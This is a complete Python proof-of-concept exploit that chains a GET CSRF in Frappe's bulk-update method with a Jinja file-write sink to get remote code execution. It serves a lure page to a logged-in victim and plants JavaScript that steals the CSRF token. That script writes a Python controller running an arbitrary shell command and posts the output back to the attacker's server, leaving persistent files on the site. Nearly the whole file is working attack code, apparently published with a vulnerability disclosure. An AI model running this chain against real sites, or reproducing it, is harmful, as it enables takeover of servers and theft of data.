#!/usr/bin/env python3
"""Frappe cross-site GET to RCE browser chain: FRAPPE-06 + FRAPPE-04.

A logged-in victim who follows an attacker lure triggers the bulk-update GET CSRF
(FRAPPE-06) to rewrite an existing Web Page into a published dynamic page whose
stored JavaScript runs on the Frappe origin. That script reads the victim's real
CSRF token and drives the safe-Jinja save() sink (FRAPPE-04) to plant a Python
controller and HTML page in an installed app's `www` directory. Loading the new
route runs a shell command and posts its output back to the attacker server.

This client hosts the lure and payload, waits for the target-origin callback, and
prints the command's status, stdout and stderr. It needs a victim who can update
the chosen Web Page and a writable installed-app www path. Reviewed against Frappe
Framework 16.29.0.

Fix status: FRAPPE-06 is fixed in Frappe 16.30.0 / 15.117.0 and FRAPPE-04 is
closed from 16.33.1 / 15.120.1, so the chain needs a site below 16.30.0 or
15.117.0.
"""

from __future__ import annotations

import argparse
import base64
import binascii
import json
import os
import re
import secrets
import socket
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer


METHOD = "frappe.desk.doctype.bulk_update.bulk_update.submit_cancel_or_update_docs"
ROUTE_RE = re.compile(r"^frappe0604_[0-9a-f]{20}$")
APP_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9_-]*$")
PACKAGE_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")
MAX_RESULT_BODY = 16 * 1024 * 1024
AUTO_INLINE_URL_LIMIT = 4000


class PocError(RuntimeError):
    pass


# --- terminal UI ---
_BANNER = r"""
 _____ ____      _    ____  ____  _____
|  ___|  _ \    / \  |  _ \|  _ \| ____|
| |_  | |_) |  / _ \ | |_) | |_) |  _|
|  _| |  _ <  / ___ \|  __/|  __/| |___
|_|   |_| \_\/_/   \_\_|   |_|   |_____|
"""
_COLOR = sys.stderr.isatty() and os.environ.get("NO_COLOR") is None


def _paint(code: str, text: str) -> str:
    return f"\033[{code}m{text}\033[0m" if _COLOR else text


def disable_color() -> None:
    global _COLOR
    _COLOR = False


def banner(subtitle: str) -> None:
    sys.stderr.write(_paint("36", _BANNER.strip("\n")) + "\n")
    sys.stderr.write("  " + _paint("2", subtitle) + "\n")
    sys.stderr.write("  " + _paint("2", "discovered by CryptoCat · cryptocat.me") + "\n\n")


def info(msg: str) -> None:
    sys.stderr.write(f" {_paint('36', '[*]')} {msg}\n")


def good(msg: str) -> None:
    sys.stderr.write(f" {_paint('32', '[+]')} {msg}\n")


def warn(msg: str) -> None:
    sys.stderr.write(f" {_paint('33', '[!]')} {msg}\n")


def bad(msg: str) -> None:
    sys.stderr.write(f" {_paint('31', '[-]')} {msg}\n")


def rule() -> None:
    sys.stderr.write(_paint("2", "  " + "-" * 60) + "\n")
# --- end terminal UI ---


def normalize_origin(value: str, label: str) -> str:
    value = value.strip().rstrip("/")
    try:
        parsed = urllib.parse.urlsplit(value)
        _ = parsed.port
    except ValueError as exc:
        raise PocError(f"invalid {label}: {exc}") from exc
    scheme = parsed.scheme.lower()
    if scheme not in {"http", "https"} or not parsed.hostname:
        raise PocError(f"{label} must be an http(s) origin")
    if parsed.username or parsed.password:
        raise PocError(f"{label} must not contain userinfo")
    if parsed.path not in {"", "/"} or parsed.query or parsed.fragment:
        raise PocError(f"{label} must not contain a path, query, or fragment")
    host = parsed.hostname.lower()
    if ":" in host:
        host = f"[{host}]"
    port = parsed.port
    default_port = 80 if scheme == "http" else 443
    netloc = host if port in {None, default_port} else f"{host}:{port}"
    return f"{scheme}://{netloc}"


def check_cross_site_inputs(target: str, public_url: str) -> None:
    target_parts = urllib.parse.urlsplit(target)
    public_parts = urllib.parse.urlsplit(public_url)
    if target_parts.hostname.lower() == public_parts.hostname.lower():
        raise PocError(
            "--public-url must use a hostname different from --url; use a "
            "different registrable site for a cross-site navigation"
        )
    if target_parts.scheme == "https" and public_parts.scheme != "https":
        raise PocError("an HTTPS target requires an HTTPS --public-url")


def normalize_web_route(value: str) -> str:
    value = value.strip().strip("/")
    parts = value.split("/")
    if (
        not value
        or any(part in {"", ".", ".."} for part in parts)
        or any(char in value for char in "?#\r\n")
    ):
        raise PocError("--web-route must be a relative route without dot segments")
    return value


def normalize_www_path(value: str) -> str:
    value = value.strip().rstrip("/")
    parts = value.split("/")
    if len(parts) != 5 or parts[:2] != ["..", "apps"] or parts[-1] != "www":
        raise PocError(
            "--www-path must be ../apps/APP/PYTHON_PACKAGE/www for an installed app"
        )
    app, package = parts[2], parts[3]
    if not APP_RE.fullmatch(app) or not PACKAGE_RE.fullmatch(package):
        raise PocError("--www-path contains an invalid app or Python package name")
    return value


def build_controller(command: str) -> str:
    return (
        "import base64\n"
        "import subprocess\n\n"
        "no_cache = 1\n\n"
        "def get_context(context):\n"
        f"    result = subprocess.run({command!r}, shell=True, "
        "stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
        "    context.chain_status = result.returncode\n"
        "    context.chain_stdout = base64.b64encode(result.stdout).decode('ascii')\n"
        "    context.chain_stderr = base64.b64encode(result.stderr).decode('ascii')\n"
    )


def build_static_page() -> str:
    return (
        "<!-- no-cache -->\n"
        '<div id="frappe-chain-status">{{ chain_status }}</div>\n'
        '<div id="frappe-chain-stdout">{{ chain_stdout }}</div>\n'
        '<div id="frappe-chain-stderr">{{ chain_stderr }}</div>\n'
    )


def build_stage_template(exec_route: str, www_path: str) -> str:
    destination = www_path + "/" + exec_route
    html_path = json.dumps(destination + ".html")
    controller_path = json.dumps(destination + ".py")
    return (
        "<!-- jinja -->\n"
        "{% if frappe.request.files.get('page') and "
        "frappe.request.files.get('controller') %}\n"
        "{{ frappe.request.files.get('page').save("
        + html_path
        + ") }}\n"
        "{{ frappe.request.files.get('controller').save("
        + controller_path
        + ") }}\n"
        "{% endif %}\n"
    )


def build_payload_javascript(
    control_base: str,
    exec_route: str,
    static_page: str,
    controller: str,
) -> str:
    config = json.dumps(
        {
            "control": control_base,
            "execRoute": exec_route,
            "staticPage": base64.b64encode(static_page.encode()).decode(),
            "controller": base64.b64encode(controller.encode()).decode(),
        },
        ensure_ascii=True,
        separators=(",", ":"),
    ).replace("<", "\\u003c")
    source = r'''"use strict";
(() => {
  if (globalThis.__frappe_06_04_running) return;
  globalThis.__frappe_06_04_running = true;
  const cfg = __CONFIG__;
  const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
  const bytes = (encoded) => {
    const raw = atob(encoded);
    return Uint8Array.from(raw, character => character.charCodeAt(0));
  };
  const returnResult = (status, stdout, stderr) => {
    const form = document.createElement("form");
    form.method = "POST";
    form.action = cfg.control + "/result";
    for (const [name, value] of Object.entries({
      route: cfg.execRoute,
      status: status,
      stdout: stdout,
      stderr: stderr,
    })) {
      const input = document.createElement("input");
      input.type = "hidden";
      input.name = name;
      input.value = value;
      form.appendChild(input);
    }
    document.body.appendChild(form);
    form.submit();
  };

  async function run() {
    if (document.readyState === "loading") {
      await new Promise(resolve => {
        document.addEventListener("DOMContentLoaded", resolve, {once: true});
      });
    }
    const csrf = globalThis.frappe && globalThis.frappe.csrf_token;
    if (!csrf) throw new Error("Web Page exposed no CSRF token");

    const files = new FormData();
    files.append(
      "page",
      new Blob([bytes(cfg.staticPage)], {type: "text/html"}),
      cfg.execRoute + ".html"
    );
    files.append(
      "controller",
      new Blob([bytes(cfg.controller)], {type: "text/x-python"}),
      cfg.execRoute + ".py"
    );
    const write = await fetch(location.pathname + "?frappe06_04=write&n=" + Date.now(), {
      method: "POST",
      credentials: "same-origin",
      headers: {"X-Frappe-CSRF-Token": csrf},
      body: files,
      cache: "no-store",
    });
    if (!write.ok) throw new Error("Jinja file-write request failed");
    await sleep(300);

    // This is the only request that imports the controller and runs the command.
    const execution = await fetch("/" + encodeURIComponent(cfg.execRoute) +
      "?frappe06_04=execute&n=" + Date.now(), {
      credentials: "same-origin",
      cache: "no-store",
    });
    const page = new DOMParser().parseFromString(await execution.text(), "text/html");
    const status = page.getElementById("frappe-chain-status")?.textContent.trim();
    const stdout = page.getElementById("frappe-chain-stdout")?.textContent.trim();
    const stderr = page.getElementById("frappe-chain-stderr")?.textContent.trim();
    if (!/^-?[0-9]+$/.test(status || "") ||
        !/^[A-Za-z0-9+/]*={0,2}$/.test(stdout || "") ||
        !/^[A-Za-z0-9+/]*={0,2}$/.test(stderr || "")) {
      throw new Error("command result fields missing (HTTP " + execution.status + ")");
    }
    returnResult(status, stdout, stderr);
  }

  run().catch(error => {
    console.error("[FRAPPE-06 + FRAPPE-04 PoC]", error);
  });
})();
'''
    return source.replace("__CONFIG__", config)


def build_script_loader(control_base: str) -> str:
    source = json.dumps(control_base + "/payload.js").replace("<", "\\u003c")
    return (
        "(()=>{const s=document.createElement('script');s.src="
        + source
        + ";document.head.append(s)})()"
    )


def build_inline_script(payload_javascript: str) -> str:
    # Keep arbitrary payload bytes out of Web Page's enclosing script element
    # without relying on eval or another string-to-code API.  The wrapper and
    # base64 alphabet contain no literal "<", so they cannot close that element.
    encoded = base64.b64encode(payload_javascript.encode()).decode()
    return (
        "(()=>{const s=document.createElement('script');s.text=atob('"
        + encoded
        + "');document.head.append(s)})()"
    )


def build_mutation_url(
    target: str, web_page: str, stage_template: str, javascript: str
) -> str:
    data = {
        "published": 1,
        "content_type": "HTML",
        "dynamic_template": 1,
        "main_section_html": stage_template,
        "javascript": javascript,
        "show_title": 0,
        "full_width": 1,
    }
    query = urllib.parse.urlencode(
        {
            "doctype": "Web Page",
            "docnames": json.dumps([web_page], separators=(",", ":")),
            "action": "update",
            "data": json.dumps(data, ensure_ascii=True, separators=(",", ":")),
        },
        quote_via=urllib.parse.quote,
    )
    return target + "/api/method/" + METHOD + "?" + query


class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, request, file_pointer, code, message, headers, url):  # noqa: ANN001, ANN201
        return None


def preflight_execution_route(
    target: str,
    exec_route: str,
    timeout: float,
    insecure: bool,
) -> None:
    url = (
        target
        + "/"
        + urllib.parse.quote(exec_route, safe="")
        + "?frappe0604=preflight&n="
        + str(time.time_ns())
    )
    tls_context = ssl.create_default_context()
    if insecure:
        tls_context.check_hostname = False
        tls_context.verify_mode = ssl.CERT_NONE
    request = urllib.request.Request(
        url,
        headers={"Cache-Control": "no-store"},
        method="GET",
    )
    opener = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=tls_context),
        NoRedirectHandler(),
    )
    try:
        with opener.open(
            request,
            timeout=timeout,
        ) as response:
            status = response.status
    except urllib.error.HTTPError as exc:
        status = exc.code
        exc.close()
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        raise PocError(f"execution-route preflight request failed: {exc}") from exc
    if status != 404:
        raise PocError(
            f"random execution route /{exec_route} returned HTTP {status}, not 404"
        )
    good(f"execution route /{exec_route} is unused (HTTP 404)")


@dataclass
class State:
    public_url: str
    token: str
    web_page: str
    web_route: str
    exec_route: str
    stage_delay_ms: int
    stage_template: str
    payload_mode: str = ""
    javascript: str = ""
    payload_javascript: str = ""
    mutation_url: str = ""
    stdout: bytes | None = None
    stderr: bytes | None = None
    status: int | None = None
    result_event: threading.Event = field(default_factory=threading.Event)
    lock: threading.Lock = field(default_factory=threading.Lock)

    @property
    def control_base(self) -> str:
        return f"{self.public_url}/{self.token}"

    @property
    def lure_url(self) -> str:
        return self.control_base + "/"

    @property
    def target_origin(self) -> str:
        parsed = urllib.parse.urlsplit(self.mutation_url)
        return f"{parsed.scheme}://{parsed.netloc}"

    def set_result(self, form: dict[str, list[str]]) -> bool:
        try:
            if set(form) != {"route", "status", "stdout", "stderr"}:
                raise ValueError("wrong result fields")
            if any(len(values) != 1 for values in form.values()):
                raise ValueError("duplicate result field")
            if form.get("route", [""])[0] != self.exec_route:
                raise ValueError("wrong execution route")
            raw_status = form.get("status", [""])[0]
            if not re.fullmatch(r"-?[0-9]+", raw_status):
                raise ValueError("invalid status")
            stdout = base64.b64decode(form.get("stdout", [""])[0], validate=True)
            stderr = base64.b64decode(form.get("stderr", [""])[0], validate=True)
        except (ValueError, binascii.Error):
            return False
        with self.lock:
            if self.result_event.is_set():
                return False
            self.status = int(raw_status)
            self.stdout = stdout
            self.stderr = stderr
            self.result_event.set()
        return True


class ControlServer(ThreadingHTTPServer):
    daemon_threads = True
    allow_reuse_address = True

    def __init__(self, address: tuple[str, int], state: State):
        self.state = state
        super().__init__(address, ControlHandler)


class ControlServerV6(ControlServer):
    address_family = socket.AF_INET6


def callback_origin_matches(state: State, origin: str | None) -> bool:
    return origin == state.target_origin


class ControlHandler(BaseHTTPRequestHandler):
    server: ControlServer

    def log_message(self, _format: str, *_args) -> None:
        return

    def send_body(self, status: int, body: bytes, content_type: str) -> None:
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(body)

    def lure_page(self) -> bytes:
        state = self.server.state
        mutation = json.dumps(state.mutation_url).replace("<", "\\u003c")
        target = urllib.parse.urlsplit(state.mutation_url)
        target_origin = f"{target.scheme}://{target.netloc}"
        page_url = target_origin + "/" + urllib.parse.quote(state.web_route, safe="/-_.~")
        stage = json.dumps(page_url + "?frappe06_04=stage").replace("<", "\\u003c")
        window_name = json.dumps("frappe06_04_" + state.exec_route)
        return (
            "<!doctype html><meta charset='utf-8'><title>Document link</title>"
            "<h1>Document link</h1><p>Open the requested document operation.</p>"
            "<button id='frappe06-trigger' type='button'>Continue</button>"
            "<p id='frappe06-status'></p><script>"
            "document.getElementById('frappe06-trigger').onclick=()=>{"
            f"const popup=window.open({mutation},{window_name});"
            "if(!popup){document.getElementById('frappe06-status').textContent="
            "'Popup blocked';return;}"
            "document.getElementById('frappe06-status').textContent='Operation opened';"
            f"setTimeout(()=>{{popup.location={stage};}},{state.stage_delay_ms});"
            "};</script>"
        ).encode()

    def do_GET(self) -> None:
        parsed = urllib.parse.urlsplit(self.path)
        state = self.server.state
        prefix = f"/{state.token}"
        if parsed.path in {prefix, prefix + "/"}:
            self.send_body(200, self.lure_page(), "text/html; charset=utf-8")
        elif parsed.path == prefix + "/payload.js":
            self.send_body(
                200,
                state.payload_javascript.encode(),
                "text/javascript; charset=utf-8",
            )
        else:
            self.send_body(404, b"not found\n", "text/plain; charset=utf-8")

    def do_POST(self) -> None:
        state = self.server.state
        if urllib.parse.urlsplit(self.path).path != f"/{state.token}/result":
            self.send_body(404, b"not found\n", "text/plain; charset=utf-8")
            return
        if not callback_origin_matches(state, self.headers.get("Origin")):
            self.send_body(403, b"wrong origin\n", "text/plain; charset=utf-8")
            return
        try:
            length = int(self.headers.get("Content-Length", "0"))
            if length <= 0 or length > MAX_RESULT_BODY:
                raise ValueError("invalid result length")
            raw = self.rfile.read(length).decode("ascii")
            form = urllib.parse.parse_qs(
                raw, keep_blank_values=True, max_num_fields=5
            )
        except (ValueError, UnicodeDecodeError):
            self.send_body(400, b"invalid result\n", "text/plain; charset=utf-8")
            return
        if not state.set_result(form):
            self.send_body(409, b"result rejected\n", "text/plain; charset=utf-8")
            return
        self.send_body(200, b"command result received\n", "text/plain; charset=utf-8")


def wait_for_chain_result(state: State, wait_seconds: float) -> None:
    if not state.result_event.wait(wait_seconds):
        raise PocError(
            f"no target-origin callback received within {wait_seconds:g} seconds"
        )


def print_command_result(status: int, stdout: bytes, stderr: bytes) -> None:
    if status == 0:
        good(f"remote command exited with status {status}")
    else:
        warn(f"remote command exited with status {status}")
    rule()
    output = sys.stdout.buffer
    output.write(f"status: {status}\nstdout:\n".encode())
    output.write(stdout)
    if stdout and not stdout.endswith(b"\n"):
        output.write(b"\n")
    output.write(b"stderr:\n")
    output.write(stderr)
    if stderr and not stderr.endswith(b"\n"):
        output.write(b"\n")
    output.flush()


def make_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="example:\n"
               "  %(prog)s --url https://frappe.example \\\n"
               "    --public-url https://attacker.example --listen-port 8000 \\\n"
               "    --web-page landing-page --web-route landing-page \\\n"
               "    --www-path ../apps/custom_app/custom_app/www -c id\n",
    )
    parser.add_argument("--url", required=True, metavar="URL", help="Frappe site base URL")
    parser.add_argument(
        "--public-url",
        required=True,
        metavar="URL",
        help="public attacker origin on a different registrable site",
    )
    parser.add_argument("--listen-host", default="0.0.0.0", metavar="HOST", help="attacker-server bind address (default: 0.0.0.0)")
    parser.add_argument("--listen-port", type=int, default=8000, metavar="PORT", help="attacker-server port (default: 8000)")
    parser.add_argument("--certfile", metavar="PATH", help="optional attacker-server TLS certificate; omit when a tunnel or proxy terminates TLS")
    parser.add_argument("--keyfile", metavar="PATH", help="optional attacker-server TLS private key; pair with --certfile")
    parser.add_argument(
        "--payload-mode",
        choices=("auto", "inline", "external"),
        default="auto",
        help=(
            "store the payload inline, load it externally, or auto-select with "
            "a 4000-byte inline URL cutoff (default)"
        ),
    )
    parser.add_argument("--web-page", required=True, metavar="NAME", help="existing Web Page document name")
    parser.add_argument("--web-route", required=True, metavar="ROUTE", help="existing Web Page route")
    parser.add_argument("-c", "--command", default="id", metavar="CMD", help="shell command to execute (default: id)")
    parser.add_argument(
        "--www-path",
        required=True,
        metavar="PATH",
        help="writable ../apps/APP/PYTHON_PACKAGE/www path in an installed app",
    )
    parser.add_argument(
        "--stage-delay", type=float, default=2.5, metavar="SECS",
        help="seconds between the mutation popup and staged-page navigation (default: 2.5)",
    )
    parser.add_argument("--wait-seconds", type=float, default=300.0, metavar="SECS", help="seconds to wait for the target callback (default: 300)")
    parser.add_argument("--timeout", type=float, default=30.0, metavar="SECS", help="HTTP timeout (default: 30)")
    parser.add_argument("--insecure", action="store_true", help="disable TLS verification for the route preflight")
    parser.add_argument("--no-color", action="store_true", help="disable coloured output")
    return parser


def run(args: argparse.Namespace) -> int:
    if args.no_color:
        disable_color()
    banner("bulk-update CSRF to Jinja RCE browser chain  ·  FRAPPE-06/04")
    if args.timeout <= 0 or args.wait_seconds <= 0 or args.stage_delay <= 0:
        raise PocError("timeouts and --stage-delay must be greater than zero")
    if not 1 <= args.listen_port <= 65535:
        raise PocError("--listen-port must be between 1 and 65535")
    if bool(args.certfile) != bool(args.keyfile):
        raise PocError("--certfile and --keyfile must be supplied together")
    if not args.web_page or any(char in args.web_page for char in "\r\n"):
        raise PocError("--web-page must be a nonempty document name")

    args.url = normalize_origin(args.url, "--url")
    public_url = normalize_origin(args.public_url, "--public-url")
    check_cross_site_inputs(args.url, public_url)
    public_scheme = urllib.parse.urlsplit(public_url).scheme
    if public_scheme != "https" and args.certfile:
        raise PocError("--certfile and --keyfile require an HTTPS --public-url")
    web_route = normalize_web_route(args.web_route)
    www_path = normalize_www_path(args.www_path)
    exec_route = "frappe0604_" + secrets.token_hex(10)
    assert ROUTE_RE.fullmatch(exec_route)
    stage_delay_ms = int(args.stage_delay * 1000)
    if stage_delay_ms <= 0:
        raise PocError("--stage-delay is too small")

    token = secrets.token_urlsafe(18)
    stage_template = build_stage_template(exec_route, www_path)
    state = State(
        public_url=public_url,
        token=token,
        web_page=args.web_page,
        web_route=web_route,
        exec_route=exec_route,
        stage_delay_ms=stage_delay_ms,
        stage_template=stage_template,
    )
    state.payload_javascript = build_payload_javascript(
        state.control_base,
        exec_route,
        build_static_page(),
        build_controller(args.command),
    )
    inline_javascript = build_inline_script(state.payload_javascript)
    inline_url = build_mutation_url(
        args.url, args.web_page, stage_template, inline_javascript
    )
    if args.payload_mode == "inline" or (
        args.payload_mode == "auto" and len(inline_url) <= AUTO_INLINE_URL_LIMIT
    ):
        state.payload_mode = "inline"
        state.javascript = inline_javascript
        state.mutation_url = inline_url
    else:
        state.payload_mode = "external"
        state.javascript = build_script_loader(state.control_base)
        state.mutation_url = build_mutation_url(
            args.url, args.web_page, stage_template, state.javascript
        )
    if len(state.mutation_url) > AUTO_INLINE_URL_LIMIT:
        warn(
            f"mutation URL is {len(state.mutation_url)} bytes and may hit "
            "browser, proxy, or server request-line limits"
        )

    server_class = ControlServerV6 if ":" in args.listen_host else ControlServer
    try:
        server = server_class((args.listen_host, args.listen_port), state)
    except OSError as exc:
        raise PocError(
            f"could not listen on {args.listen_host}:{args.listen_port}: {exc}"
        ) from exc
    if args.certfile:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        try:
            context.load_cert_chain(args.certfile, args.keyfile)
        except (OSError, ssl.SSLError) as exc:
            server.server_close()
            raise PocError(f"could not load the TLS certificate/key: {exc}") from exc
        server.socket = context.wrap_socket(server.socket, server_side=True)
    elif public_scheme == "https":
        warn(
            "serving plain HTTP on the listen port; front --public-url with a TLS "
            "terminator such as an ngrok or cloudflared tunnel or a reverse proxy"
        )
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        info(f"execution route: /{exec_route}")
        info(f"payload mode: {state.payload_mode}")
        preflight_execution_route(
            args.url,
            state.exec_route,
            args.timeout,
            args.insecure,
        )
        good("lure ready — send this URL to the logged-in victim:")
        print(state.lure_url, file=sys.stderr, flush=True)
        info(f"waiting up to {args.wait_seconds:g}s for the target-origin callback")
        wait_for_chain_result(state, args.wait_seconds)
        good("target-origin callback received")

        assert state.status is not None and state.stdout is not None and state.stderr is not None
        print_command_result(state.status, state.stdout, state.stderr)
        warn(f"persistent files left behind: {www_path}/{exec_route}.html and {www_path}/{exec_route}.py")
        return 0
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2)


def main() -> int:
    try:
        return run(make_parser().parse_args())
    except PocError as exc:
        bad(str(exc))
        return 1
    except KeyboardInterrupt:
        bad("interrupted")
        return 130


if __name__ == "__main__":
    raise SystemExit(main())
